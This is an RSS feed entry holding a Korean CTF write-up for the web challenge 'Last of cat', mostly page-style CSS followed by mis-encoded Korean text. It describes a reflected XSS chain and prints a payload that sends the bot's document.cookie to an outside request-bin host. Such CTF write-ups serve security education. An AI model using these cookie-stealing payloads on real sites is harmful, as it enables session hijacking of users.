<?xml version="1.0" encoding="UTF-8"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>Core-Research-Team</title>
    <description>RAON Whitehat Core-Research-Team Blog</description>
    <link>http://localhost:4000/</link>
    <atom:link href="http://localhost:4000/feed.xml" rel="self" type="application/rss+xml"/>
    <pubDate>Wed, 02 Sep 2020 13:31:22 +0000</pubDate>
    <lastBuildDate>Wed, 02 Sep 2020 13:31:22 +0000</lastBuildDate>
    <generator>Jekyll v4.0.1</generator>
    
      <item>
        <title>2020 BoB 9th CTF Write-up</title>
        <description>&lt;html&gt;&lt;head&gt;&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot;/&gt;&lt;title&gt;2020 BoB CTF Write-up &lt;/title&gt;&lt;style&gt;
/* webkit printing magic: print all background colors */




@media only screen {
	body {
		margin: 2em auto;
		max-width: 900px;
		color: rgb(55, 53, 47);
	}
}





.pdf-relative-link-path {
	font-size: 80%;
	color: #444;
}



.page-title {
	font-size: 2.5rem;
	font-weight: 700;
	margin-top: 0;
	margin-bottom: 0.75em;
}







.source {
	border: 1px solid #ddd;
	border-radius: 3px;
	padding: 1.5em;
	word-break: break-all;
}

.callout {
	border-radius: 3px;
	padding: 1rem;
}

figure {
	margin: 1.25em 0;
	page-break-inside: avoid;
}

figcaption {
	opacity: 0.5;
	font-size: 85%;
	margin-top: 0.5em;
}

mark {
	background-color: transparent;
}

.indented {
	padding-left: 1.5em;
}

hr {
	background: transparent;
	display: block;
	width: 100%;
	height: 1px;
	visibility: visible;
	border: none;
	border-bottom: 1px solid rgba(55, 53, 47, 0.09);
}

img {
	max-width: 100%;
}

@media only print {
	img {
		max-height: 100vh;
		object-fit: contain;
	}
}

@page {
	margin: 1in;
}

.collection-content {
	font-size: 0.875rem;
}

.column-list {
	display: flex;
	justify-content: space-between;
}

.column {
	padding: 0 1em;
}

.column:first-child {
	padding-left: 0;
}

.column:last-child {
	padding-right: 0;
}

.table_of_contents-item {
	display: block;
	font-size: 0.875rem;
	line-height: 1.3;
	padding: 0.125rem;
}

.table_of_contents-indent-1 {
	margin-left: 1.5rem;
}

.table_of_contents-indent-2 {
	margin-left: 3rem;
}

.table_of_contents-indent-3 {
	margin-left: 4.5rem;
}

.table_of_contents-link {
	text-decoration: none;
	opacity: 0.7;
	border-bottom: 1px solid rgba(55, 53, 47, 0.18);
}

table,
th,
td {
	border: 1px solid rgba(55, 53, 47, 0.09);
	border-collapse: collapse;
}

table {
	border-left: none;
	border-right: none;
}

th,
td {
	font-weight: normal;
	padding: 0.25em 0.5em;
	line-height: 1.5;
	min-height: 1.5em;
	text-align: left;
}

th {
	color: rgba(55, 53, 47, 0.6);
}

ol,
ul {
	margin: 0;
	margin-block-start: 0.6em;
	margin-block-end: 0.6em;
}

li &gt; ol:first-child,
li &gt; ul:first-child {
	margin-block-start: 0.6em;
}

ul &gt; li {
	list-style: disc;
}

ul.to-do-list {
	text-indent: -1.7em;
}

ul.to-do-list &gt; li {
	list-style: none;
}

.to-do-children-checked {
	text-decoration: line-through;
	opacity: 0.375;
}

ul.toggle &gt; li {
	list-style: none;
}

ul {
	padding-inline-start: 1.7em;
}

ul &gt; li {
	padding-left: 0.1em;
}

ol {
	padding-inline-start: 1.6em;
}

ol &gt; li {
	padding-left: 0.2em;
}

.mono ol {
	padding-inline-start: 2em;
}

.mono ol &gt; li {
	text-indent: -0.4em;
}

.toggle {
	padding-inline-start: 0em;
	list-style-type: none;
}

/* Indent toggle children */
.toggle &gt; li &gt; details {
	padding-left: 1.7em;
}

.toggle &gt; li &gt; details &gt; summary {
	margin-left: -1.1em;
}

.selected-value {
	display: inline-block;
	padding: 0 0.5em;
	background: rgba(206, 205, 202, 0.5);
	border-radius: 3px;
	margin-right: 0.5em;
	margin-top: 0.3em;
	margin-bottom: 0.3em;
	white-space: nowrap;
}

.collection-title {
	display: inline-block;
	margin-right: 1em;
}

time {
	opacity: 0.5;
}

.icon {
	display: inline-block;
	max-width: 1.2em;
	max-height: 1.2em;
	text-decoration: none;
	vertical-align: text-bottom;
	margin-right: 0.5em;
}

img.icon {
	border-radius: 3px;
}

.user-icon {
	width: 1.5em;
	height: 1.5em;
	border-radius: 100%;
	margin-right: 0.5rem;
}

.user-icon-inner {
	font-size: 0.8em;
}

.text-icon {
	border: 1px solid #000;
	text-align: center;
}

.page-cover-image {
	display: block;
	object-fit: cover;
	width: 100%;
	height: 30vh;
}

.page-header-icon {
	font-size: 3rem;
	margin-bottom: 1rem;
}

.page-header-icon-with-cover {
	margin-top: -0.72em;
	margin-left: 0.07em;
}

.page-header-icon img {
	border-radius: 3px;
}

.link-to-page {
	margin: 1em 0;
	padding: 0;
	border: none;
	font-weight: 500;
}

p &gt; .user {
	opacity: 0.5;
}

td &gt; .user,
td &gt; time {
	white-space: nowrap;
}

input[type=&quot;checkbox&quot;] {
	transform: scale(1.5);
	margin-right: 0.6em;
	vertical-align: middle;
}

p {
	margin-top: 0.5em;
	margin-bottom: 0.5em;
}

.image {
	border: none;
	margin: 1.5em 0;
	padding: 0;
	border-radius: 0;
	text-align: center;
}

.code,
code {
	background: rgba(135, 131, 120, 0.15);
	border-radius: 3px;
	padding: 0.2em 0.4em;
	border-radius: 3px;
	font-size: 85%;
	tab-size: 2;
}

code {
	color: #eb5757;
}

.code {
	padding: 1.5em 1em;
	white-space: pre-wrap;
}

.code-wrap {
	white-space: pre-wrap;
	word-break: break-all;
}

.code &gt; code {
	background: none;
	padding: 0;
	font-size: 100%;
	color: inherit;
}

blockquote {
	font-size: 1.25em;
	margin: 1em 0;
	padding-left: 1em;
	border-left: 3px solid rgb(55, 53, 47);
}

.bookmark {
	text-decoration: none;
	max-height: 8em;
	padding: 0;
	display: flex;
	width: 100%;
	align-items: stretch;
}

.bookmark-title {
	font-size: 0.85em;
	overflow: hidden;
	text-overflow: ellipsis;
	height: 1.75em;
	white-space: nowrap;
}

.bookmark-text {
	display: flex;
	flex-direction: column;
}

.bookmark-info {
	flex: 4 1 180px;
	padding: 12px 14px 14px;
	display: flex;
	flex-direction: column;
	justify-content: space-between;
}

.bookmark-image {
	width: 33%;
	flex: 1 1 180px;
	display: block;
	position: relative;
	object-fit: cover;
	border-radius: 1px;
}

.bookmark-description {
	color: rgba(55, 53, 47, 0.6);
	font-size: 0.75em;
	overflow: hidden;
	max-height: 4.5em;
	word-break: break-word;
}

.bookmark-href {
	font-size: 0.75em;
	margin-top: 0.25em;
}

.sans { font-family: -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Helvetica, &quot;Apple Color Emoji&quot;, Arial, sans-serif, &quot;Segoe UI Emoji&quot;, &quot;Segoe UI Symbol&quot;; }
.code { font-family: &quot;SFMono-Regular&quot;, Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace; }
.serif { font-family: Lyon-Text, Georgia, YuMincho, &quot;Yu Mincho&quot;, &quot;Hiragino Mincho ProN&quot;, &quot;Hiragino Mincho Pro&quot;, &quot;Songti TC&quot;, &quot;Songti SC&quot;, &quot;SimSun&quot;, &quot;Nanum Myeongjo&quot;, NanumMyeongjo, Batang, serif; }
.mono { font-family: iawriter-mono, Nitti, Menlo, Courier, monospace; }
.pdf .sans { font-family: Inter, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Helvetica, &quot;Apple Color Emoji&quot;, Arial, sans-serif, &quot;Segoe UI Emoji&quot;, &quot;Segoe UI Symbol&quot;, 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK SC', 'Noto Sans CJK KR'; }

.pdf .code { font-family: Source Code Pro, &quot;SFMono-Regular&quot;, Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC', 'Noto Sans Mono CJK KR'; }

.pdf .serif { font-family: PT Serif, Lyon-Text, Georgia, YuMincho, &quot;Yu Mincho&quot;, &quot;Hiragino Mincho ProN&quot;, &quot;Hiragino Mincho Pro&quot;, &quot;Songti TC&quot;, &quot;Songti SC&quot;, &quot;SimSun&quot;, &quot;Nanum Myeongjo&quot;, NanumMyeongjo, Batang, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK SC', 'Noto Sans CJK KR'; }

.pdf .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC', 'Noto Sans Mono CJK KR'; }

.highlight-default {
}
.highlight-gray {
	color: rgb(155,154,151);
}
.highlight-brown {
	color: rgb(100,71,58);
}
.highlight-orange {
	color: rgb(217,115,13);
}
.highlight-yellow {
	color: rgb(223,171,1);
}
.highlight-teal {
	color: rgb(15,123,108);
}
.highlight-blue {
	color: rgb(11,110,153);
}
.highlight-purple {
	color: rgb(105,64,165);
}
.highlight-pink {
	color: rgb(173,26,114);
}
.highlight-red {
	color: rgb(224,62,62);
}
.highlight-gray_background {
	background: rgb(235,236,237);
}
.highlight-brown_background {
	background: rgb(233,229,227);
}
.highlight-orange_background {
	background: rgb(250,235,221);
}
.highlight-yellow_background {
	background: rgb(251,243,219);
}
.highlight-teal_background {
	background: rgb(221,237,234);
}
.highlight-blue_background {
	background: rgb(221,235,241);
}
.highlight-purple_background {
	background: rgb(234,228,242);
}
.highlight-pink_background {
	background: rgb(244,223,235);
}
.highlight-red_background {
	background: rgb(251,228,228);
}
.block-color-default {
	color: inherit;
	fill: inherit;
}
.block-color-gray {
	color: rgba(55, 53, 47, 0.6);
	fill: rgba(55, 53, 47, 0.6);
}
.block-color-brown {
	color: rgb(100,71,58);
	fill: rgb(100,71,58);
}
.block-color-orange {
	color: rgb(217,115,13);
	fill: rgb(217,115,13);
}
.block-color-yellow {
	color: rgb(223,171,1);
	fill: rgb(223,171,1);
}
.block-color-teal {
	color: rgb(15,123,108);
	fill: rgb(15,123,108);
}
.block-color-blue {
	color: rgb(11,110,153);
	fill: rgb(11,110,153);
}
.block-color-purple {
	color: rgb(105,64,165);
	fill: rgb(105,64,165);
}
.block-color-pink {
	color: rgb(173,26,114);
	fill: rgb(173,26,114);
}
.block-color-red {
	color: rgb(224,62,62);
	fill: rgb(224,62,62);
}
.block-color-gray_background {
	background: rgb(235,236,237);
}
.block-color-brown_background {
	background: rgb(233,229,227);
}
.block-color-orange_background {
	background: rgb(250,235,221);
}
.block-color-yellow_background {
	background: rgb(251,243,219);
}
.block-color-teal_background {
	background: rgb(221,237,234);
}
.block-color-blue_background {
	background: rgb(221,235,241);
}
.block-color-purple_background {
	background: rgb(234,228,242);
}
.block-color-pink_background {
	background: rgb(244,223,235);
}
.block-color-red_background {
	background: rgb(251,228,228);
}
.select-value-color-default { background-color: rgba(206,205,202,0.5); }
.select-value-color-gray { background-color: rgba(155,154,151, 0.4); }
.select-value-color-brown { background-color: rgba(140,46,0,0.2); }
.select-value-color-orange { background-color: rgba(245,93,0,0.2); }
.select-value-color-yellow { background-color: rgba(233,168,0,0.2); }
.select-value-color-green { background-color: rgba(0,135,107,0.2); }
.select-value-color-blue { background-color: rgba(0,120,223,0.2); }
.select-value-color-purple { background-color: rgba(103,36,222,0.2); }
.select-value-color-pink { background-color: rgba(221,0,129,0.2); }
.select-value-color-red { background-color: rgba(255,0,26,0.2); }

.checkbox {
	display: inline-flex;
	vertical-align: text-bottom;
	width: 16;
	height: 16;
	background-size: 16px;
	margin-left: 2px;
	margin-right: 5px;
}

.checkbox-on {
	background-image: url(&quot;data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20width%3D%2216%22%20height%3D%2216%22%20fill%3D%22%2358A9D7%22%2F%3E%0A%3Cpath%20d%3D%22M6.71429%2012.2852L14%204.9995L12.7143%203.71436L6.71429%209.71378L3.28571%206.2831L2%207.57092L6.71429%2012.2852Z%22%20fill%3D%22white%22%2F%3E%0A%3C%2Fsvg%3E&quot;);
}

.checkbox-off {
	background-image: url(&quot;data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20x%3D%220.75%22%20y%3D%220.75%22%20width%3D%2214.5%22%20height%3D%2214.5%22%20fill%3D%22white%22%20stroke%3D%22%2336352F%22%20stroke-width%3D%221.5%22%2F%3E%0A%3C%2Fsvg%3E&quot;);
}
	
&lt;/style&gt;&lt;/head&gt;&lt;body&gt;&lt;article id=&quot;610af24a-8be5-44c4-aa60-1e3ec4abc36e&quot; class=&quot;page sans&quot;&gt;&lt;header&gt;&lt;h1 class=&quot;page-title&quot;&gt;2020 BoB CTF Write-up &lt;/h1&gt;&lt;/header&gt;&lt;div class=&quot;page-body&quot;&gt;&lt;h1 id=&quot;b04ec55f-b75d-47ac-8be0-1337c2641f96&quot; class=&quot;&quot;&gt;ğŸ–¥ï¸ WEB&lt;/h1&gt;&lt;h2 id=&quot;c82dbe3a-6871-44af-a8b3-13c1fe0e55e4&quot; class=&quot;&quot;&gt;Last of cat&lt;/h2&gt;&lt;hr id=&quot;71e83b5d-98da-4a05-acb8-66600756bd1b&quot;/&gt;&lt;figure id=&quot;15ed549f-6ae0-460c-bf96-e597a76f40d9&quot; class=&quot;image&quot;&gt;&lt;a href=&quot;/assets/bob/bob9Untitled.png&quot;&gt;&lt;img style=&quot;width:711px&quot; src=&quot;/assets/bob/bob9Untitled.png&quot;/&gt;&lt;/a&gt;&lt;/figure&gt;&lt;figure class=&quot;block-color-gray_background callout&quot; style=&quot;white-space:pre-wrap;display:flex&quot; id=&quot;3762cf8b-b2d6-4c78-9ef8-17506f7ede2f&quot;&gt;&lt;div style=&quot;font-size:1.5em&quot;&gt;&lt;span class=&quot;icon&quot;&gt;ğŸ’¡&lt;/span&gt;&lt;/div&gt;&lt;div style=&quot;width:100%&quot;&gt;Last of Cat &lt;/div&gt;&lt;/figure&gt;&lt;figure id=&quot;db8f1ac0-cca6-4cfb-8b31-377ae54b6627&quot; class=&quot;image&quot;&gt;&lt;a href=&quot;/assets/bob/bob91.png&quot;&gt;&lt;img style=&quot;width:952px&quot; src=&quot;/assets/bob/bob91.png&quot;/&gt;&lt;/a&gt;&lt;/figure&gt;&lt;ul id=&quot;53a5b42d-7e91-461a-a00b-45f1e8228725&quot; class=&quot;bulleted-list&quot;&gt;&lt;li&gt;&lt;code&gt;Last of Cat&lt;/code&gt;  í˜ì´ì§€ì— ì ‘ì†í•˜ë©´ &lt;code&gt;Login Page&lt;/code&gt;ê°€ ì¶œë ¥ë©ë‹ˆë‹¤.  íšŒì›ê°€ì…ì„ í•˜ê¸° ìœ„í•´ &lt;code&gt;Join&lt;/code&gt; ë²„íŠ¼ì„ í´ë¦­í•œë‹¤.&lt;/li&gt;&lt;/ul&gt;&lt;figure id=&quot;a57df5a0-2321-48e6-beea-50890350a60d&quot; class=&quot;image&quot;&gt;&lt;a href=&quot;/assets/bob/bob92.png&quot;&gt;&lt;img style=&quot;width:952px&quot; src=&quot;/assets/bob/bob92.png&quot;/&gt;&lt;/a&gt;&lt;/figure&gt;&lt;ul id=&quot;ab3852c4-ad6d-4eb1-a6b2-88f6f2fbb27d&quot; class=&quot;bulleted-list&quot;&gt;&lt;li&gt;íšŒì›ê°€ì…í•˜ê³  ë¡œê·¸ì¸ì„ í•˜ì—¬ ë©”ë‰´ë¥¼ í™•ì¸í•œë‹¤.&lt;/li&gt;&lt;/ul&gt;&lt;figure id=&quot;41ad817b-8b51-4f14-91ba-91daaf08b1ce&quot; class=&quot;image&quot;&gt;&lt;a href=&quot;/assets/bob/bob93.png&quot;&gt;&lt;img style=&quot;width:1222px&quot; src=&quot;/assets/bob/bob93.png&quot;/&gt;&lt;/a&gt;&lt;/figure&gt;&lt;ul id=&quot;74b752a5-14bc-43a3-b1bd-97e047387137&quot; class=&quot;bulleted-list&quot;&gt;&lt;li&gt;&lt;code&gt;Cat&lt;/code&gt;ë©”ë‰´ì—ì„œëŠ” ê³ ì–‘ì´ ì‚¬ì§„ì„ í™•ì¸í•  ìˆ˜ ìˆë‹¤.&lt;/li&gt;&lt;/ul&gt;&lt;figure id=&quot;66b00b2a-c42f-4b7b-bf7f-27a8062e2025&quot; class=&quot;image&quot;&gt;&lt;a href=&quot;/assets/bob/bob94.png&quot;&gt;&lt;img style=&quot;width:1222px&quot; src=&quot;/assets/bob/bob94.png&quot;/&gt;&lt;/a&gt;&lt;/figure&gt;&lt;p id=&quot;17f6fda0-5c76-4e06-bc98-719d3b7c1e0e&quot; class=&quot;&quot;&gt;
&lt;/p&gt;&lt;ul id=&quot;89b9ea98-3242-424f-a748-d9edad81e509&quot; class=&quot;bulleted-list&quot;&gt;&lt;li&gt;&lt;code&gt;Bot&lt;/code&gt; ì—ì„œëŠ” &lt;code&gt;Input URL&lt;/code&gt; ê¸°ëŠ¥ì„ í†µí•´ ë´‡ì—ê²Œ XSS êµ¬ë¬¸ì„ ì „ì†¡í•  ìˆ˜ ìˆë‹¤. ì•„ë˜ &lt;code&gt;Bot Log&lt;/code&gt;  í…Œì´ë¸”ì—ì„œ ë´‡ì´ ë‚´ URLì„ í™•ì¸í–ˆëŠ”ì§€ ë°”ë¡œ í™•ì¸ì´ ê°€ëŠ¥í•˜ë‹¤.&lt;/li&gt;&lt;/ul&gt;&lt;blockquote id=&quot;4025aedf-f51a-440b-9f85-0c9d837e8897&quot; class=&quot;&quot;&gt;ì´ ë¬¸ì œëŠ” XSSê°€ ë°œìƒí•˜ëŠ” í˜ì´ì§€ë¥¼ ì°¾ì•„ í•´ë‹¹ í˜ì´ì§€ë¥¼ í†µí•´ &lt;strong&gt;ì¿ í‚¤ë¥¼ íƒˆì·¨í•˜ëŠ” ìŠ¤í¬ë¦½íŠ¸ë¥¼ ì‘ì„±í•˜ë©´ í’€ë¦¬ëŠ”&lt;/strong&gt; ê°„ë‹¨í•œ ë¬¸ì œë‹¤.&lt;/blockquote&gt;&lt;figure id=&quot;91ad5aea-48e2-48c6-8af8-174d561984bf&quot; class=&quot;image&quot;&gt;&lt;a href=&quot;/assets/bob/bob95.png&quot;&gt;&lt;img style=&quot;width:1278px&quot; src=&quot;/assets/bob/bob95.png&quot;/&gt;&lt;/a&gt;&lt;/figure&gt;&lt;ul id=&quot;e3835d41-cb54-4e08-ba15-8f7c901f38ce&quot; class=&quot;bulleted-list&quot;&gt;&lt;li&gt;Cat Pageì— ì ‘ì†í•˜ë©´ ìœ„ í™”ë©´ê³¼ ê°™ì€ ê³ ì–‘ì´ ì‚¬ì§„ê³¼ ë¬¸êµ¬ê°€ ì¶œë ¥ëœë‹¤.&lt;/li&gt;&lt;/ul&gt;&lt;ul id=&quot;8586f923-92c0-46a9-b8c6-52ef88a57e30&quot; class=&quot;bulleted-list&quot;&gt;&lt;li&gt;ì‚¬ì§„ê³¼ ë¬¸êµ¬ë¥¼ ì¶œë ¥í•˜ëŠ” ë£¨í‹´ì„ ì‚´í´ë³´ë©´, src íŒŒë¼ë¯¸í„°ë¥¼ í†µí•´ htmlì„ ì½ì–´ì˜¨ë‹¤. í•´ë‹¹ ê¸°ëŠ¥ì„ ì´ìš©í•˜ì—¬ XSSë¥¼ ë°œìƒì‹œí‚¬ ìˆ˜ ìˆë‹¤.&lt;/li&gt;&lt;/ul&gt;&lt;pre id=&quot;c9d92000-e0b0-4f60-b169-d0068b5f31d5&quot; class=&quot;code&quot;&gt;&lt;code&gt;http://bob.zairo.kr:1337/catview?&lt;mark class=&quot;highlight-teal_background&quot;&gt;&lt;strong&gt;src=http://bob.zairo.kr:1337/cats/ae7d0baaa9b7ad791a6bfa53c936490e.html&lt;/strong&gt;&lt;/mark&gt;&lt;/code&gt;&lt;/pre&gt;&lt;p id=&quot;0c679325-bed0-42f1-890d-1b4e2d966a30&quot; class=&quot;&quot;&gt;
&lt;/p&gt;&lt;figure id=&quot;d6e9c1e4-737e-46d0-be8f-f4e6d0cc4ba1&quot; class=&quot;image&quot;&gt;&lt;a href=&quot;/assets/bob/bob96.png&quot;&gt;&lt;img style=&quot;width:1047px&quot; src=&quot;/assets/bob/bob96.png&quot;/&gt;&lt;/a&gt;&lt;/figure&gt;&lt;figure id=&quot;0df9839e-d9c2-4ed5-8dc2-749be3445639&quot; class=&quot;image&quot;&gt;&lt;a href=&quot;/assets/bob/bob97.png&quot;&gt;&lt;img style=&quot;width:578px&quot; src=&quot;/assets/bob/bob97.png&quot;/&gt;&lt;/a&gt;&lt;/figure&gt;&lt;ul id=&quot;549135d9-5bd3-455a-b50a-a0dfd18b459f&quot; class=&quot;bulleted-list&quot;&gt;&lt;li&gt;&lt;code&gt;Cat&lt;/code&gt; í˜ì´ì§€ì—ì„œ  &lt;code&gt;View&lt;/code&gt; ë²„íŠ¼ì„ í´ë¦­í• ë•Œë¥¼ Fiddlerë¡œ ì‚´í´ë³´ë©´ &lt;code&gt;getlink&lt;/code&gt; í˜ì´ì§€ì— &lt;code&gt;idx=ìˆ«ì&lt;/code&gt; í˜•ì‹ìœ¼ë¡œ í˜ì´ì§€ë¥¼ ìš”ì²­í•˜ëŠ”ê²ƒì„ í™•ì¸í•  ìˆ˜ ìˆë‹¤. &lt;/li&gt;&lt;/ul&gt;&lt;figure id=&quot;4e9bd89f-fd5e-46fb-95af-4b0936900505&quot; class=&quot;image&quot;&gt;&lt;a href=&quot;/assets/bob/bob98.png&quot;&gt;&lt;img style=&quot;width:555px&quot; src=&quot;/assets/bob/bob98.png&quot;/&gt;&lt;/a&gt;&lt;/figure&gt;&lt;ul id=&quot;a159fe62-517d-4ff9-9777-fc999603c442&quot; class=&quot;bulleted-list&quot;&gt;&lt;li&gt;&lt;code&gt;/getlink?idx=2&lt;/code&gt; ì— ì ‘ì†í•˜ë©´ ìœ„ì™€ ê°™ì´ idxì™€ linkê°€ ì¶œë ¥ëœë‹¤. &lt;/li&gt;&lt;/ul&gt;&lt;figure id=&quot;809f30da-768e-42d3-a104-4c94b782f9ef&quot; class=&quot;image&quot;&gt;&lt;a href=&quot;/assets/bob/bob99.png&quot;&gt;&lt;img style=&quot;width:617px&quot; src=&quot;/assets/bob/bob99.png&quot;/&gt;&lt;/a&gt;&lt;/figure&gt;&lt;ul id=&quot;ab73e8d9-3deb-46ab-a2f1-ee44526291a7&quot; class=&quot;bulleted-list&quot;&gt;&lt;li&gt;getlink í˜ì´ì§€ì— ì„ì˜ ê°’ì„ ì…ë ¥í•  ê²½ìš° ê·¸ëŒ€ë¡œ ì¶œë ¥í•´ì£¼ëŠ”ë° í•´ë‹¹ í˜ì´ì§€ì˜ ì‘ë‹µì˜ &lt;code&gt;Content-Type&lt;/code&gt; ì€ &lt;code&gt;application/json&lt;/code&gt;ì´ë¼ ìŠ¤í¬ë¦½íŠ¸ê°€ ì‹¤í–‰ë˜ì§€ ì•ŠëŠ”ë‹¤. í•˜ì§€ë§Œ, íŠ¹ì • í˜ì´ì§€ë¥¼ ë¡œë“œì‹œì¼œ í˜ì´ì§€ ë‚´ë¶€ì— í¬í•¨í•˜ëŠ” ê²½ìš° í•´ë‹¹ í˜ì´ì§€ë¥¼ ì´ìš©í•˜ì—¬ XSSë¥¼ ë°œìƒì‹œí‚¬ ìˆ˜ ìˆë‹¤.&lt;/li&gt;&lt;/ul&gt;&lt;figure id=&quot;d99a0d7d-a965-4ba1-9e03-c15696a2dd3b&quot; class=&quot;image&quot;&gt;&lt;a href=&quot;/assets/bob/bob910.png&quot;&gt;&lt;img style=&quot;width:1033px&quot; src=&quot;/assets/bob/bob910.png&quot;/&gt;&lt;/a&gt;&lt;/figure&gt;&lt;pre id=&quot;13213855-1bdf-4f58-b183-cc44f45784c2&quot; class=&quot;code&quot;&gt;&lt;code&gt;&lt;a href=&quot;http://bob.zairo.kr:1337/catview?src=http%3A%2F%2Fbob.zairo.kr%3A1337%2Fgetlink%3Fidx%3D%253Cscript%253Ealert(1)%253C%252Fscript%253E&quot;&gt;http://bob.zairo.kr:1337/catview?src=&lt;/a&gt;&lt;a href=&quot;http://bob.zairo.kr:1337/catview?src=http%3A%2F%2Fbob.zairo.kr%3A1337%2Fgetlink%3Fidx%3D%253Cscript%253Ealert(1)%253C%252Fscript%253E&quot;&gt;&lt;mark class=&quot;highlight-teal_background&quot;&gt;&lt;strong&gt;http%3A%2F%2Fbob.zairo.kr%3A1337%2Fgetlink%3Fidx%3D&lt;/strong&gt;&lt;/mark&gt;&lt;/a&gt;&lt;mark class=&quot;highlight-teal_background&quot;&gt;&lt;strong&gt;%253Cscript%253Ealert(1)%253C%252Fscript%253E&lt;/strong&gt;&lt;/mark&gt;&lt;/code&gt;&lt;/pre&gt;&lt;ul id=&quot;381b53ac-4789-41af-bd4d-a6a49e9cd51e&quot; class=&quot;bulleted-list&quot;&gt;&lt;li&gt;&lt;code&gt;src&lt;/code&gt;ì— getlink í˜ì´ì§€ idx íŒŒë¼ë¯¸í„° ê°’ì— &lt;a href=&quot;http://bob.zairo.kr:1337/getlink?idx=&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;&quot;&gt;&lt;code&gt;&amp;lt;script&amp;gt;alert(1);&amp;lt;/script&amp;gt;&lt;/code&gt;&lt;/a&gt; ë¥¼ 2ë²ˆ URL Encoding í•˜ì—¬ ì…ë ¥í•˜ë©´ ê·¸ë¦¼ê³¼ ê°™ì´ alert êµ¬ë¬¸ì´ ì‹¤í–‰ë˜ëŠ” ê²ƒì„ í™•ì¸í•  ìˆ˜ ìˆë‹¤.&lt;/li&gt;&lt;/ul&gt;&lt;figure id=&quot;a0e01dc3-47f9-4e27-9600-8f7777823d08&quot; class=&quot;image&quot;&gt;&lt;a href=&quot;/assets/bob/bob911.png&quot;&gt;&lt;img style=&quot;width:1033px&quot; src=&quot;/assets/bob/bob911.png&quot;/&gt;&lt;/a&gt;&lt;/figure&gt;&lt;ul id=&quot;cd24a688-a304-42e1-8ba2-aea692350e1b&quot; class=&quot;bulleted-list&quot;&gt;&lt;li&gt;&lt;code&gt;request bin&lt;/code&gt;ì„ ì´ìš©í•´ ì„ì˜ ì„œë²„ë¡œ ì¿ í‚¤ë¥¼ ì „ì†¡í•˜ë„ë¡ í•˜ì—¬ íƒˆì·¨í•˜ë„ë¡ í•œë‹¤&lt;/li&gt;&lt;/ul&gt;&lt;figure id=&quot;b24491ea-1e9f-4ea1-8f44-2182a75d8ed4&quot; class=&quot;image&quot;&gt;&lt;a href=&quot;/assets/bob/bob912.png&quot;&gt;&lt;img style=&quot;width:1920px&quot; src=&quot;/assets/bob/bob912.png&quot;/&gt;&lt;/a&gt;&lt;/figure&gt;&lt;p id=&quot;158c7216-c6bd-460c-9ba2-ffc3fbf55375&quot; class=&quot;&quot;&gt;&lt;strong&gt;&lt;mark class=&quot;highlight-teal_background&quot;&gt;Payload&lt;/mark&gt;&lt;/strong&gt;&lt;/p&gt;&lt;blockquote id=&quot;728a9609-932f-475e-b9d0-9e2af21fc8d0&quot; class=&quot;&quot;&gt;&lt;a href=&quot;http://bob.zairo.kr:1337/catview?src=http://bob.zairo.kr:1337/getlink?idx=http%253A%252F%252Fbob.zairo.kr%253A1337%252Fgetlink%253Fidx%253D%253Cscript%253Edocument.location.href%253D%2527https%253A%252F%252Fenwm946jeqwe.x.pipedream.net%252F%253Fparam%2527%252Bdocument.cookie%253C%252Fscript%253E&quot;&gt;http://bob.zairo.kr:1337/catview?src=http://bob.zairo.kr:1337/getlink?idx=http%3A%2F%2Fbob.zairo.kr%3A1337%2Fgetlink%3Fidx%3D%3Cscript%3Edocument.location.href%3D%27https%3A%2F%2Fenwm946jeqwe.x.pipedream.net%2F%3Fparam%27%2Bdocument.cookie%3C%2Fscript%3E&lt;/a&gt;&lt;/blockquote&gt;&lt;blockquote id=&quot;0639dbb2-7e96-4f04-baca-ef0e78c980f7&quot; class=&quot;&quot;&gt;&lt;a href=&quot;http://bob.zairo.kr:1337/catview?src=http://bob.zairo.kr:1337/getlink?idx=http://bob.zairo.kr:1337/getlink?idx=&quot;&gt;http://bob.zairo.kr:1337/catview?src=http://bob.zairo.kr:1337/getlink?idx=http://bob.zairo.kr:1337/getlink?idx=&lt;/a&gt;&lt;mark class=&quot;highlight-gray_background&quot;&gt;&lt;strong&gt;&amp;lt;script&amp;gt;document.location.href=&amp;#x27;&lt;/strong&gt;&lt;/mark&gt;&lt;mark class=&quot;highlight-gray_background&quot;&gt;&lt;strong&gt;&lt;a href=&quot;https://enwm946jeqwe.x.pipedream.net/?param&quot;&gt;https://enwm946jeqwe.x.pipedream.net/?param&lt;/a&gt;&lt;/strong&gt;&lt;/mark&gt;&lt;mark class=&quot;highlight-gray_background&quot;&gt;&lt;strong&gt;&amp;#x27;+ document.cookie&amp;lt;/script&amp;gt;&lt;/strong&gt;&lt;/mark&gt;&lt;/blockquote&gt;&lt;ul id=&quot;d8fc2371-889d-432b-9d0f-fa6c8dc67b6d&quot; class=&quot;bulleted-list&quot;&gt;&lt;li&gt;ìœ„ êµ¬ë¬¸ì„ í†µí•´ &lt;code&gt;catview&lt;/code&gt; í˜ì´ì§€ì—ì„œ &lt;code&gt;src&lt;/code&gt; íŒŒë¼ë¯¸í„°ë¡œ ê°’ì„ ì²˜ë¦¬í•  ë•Œ &lt;code&gt;getlink&lt;/code&gt; í˜ì´ì§€ì— ì ‘ì†í•˜ê³  &lt;code&gt;getlink&lt;/code&gt; í˜ì´ì§€ì˜ &lt;code&gt;idx&lt;/code&gt;ì— ì…ë ¥ ë˜ì–´ 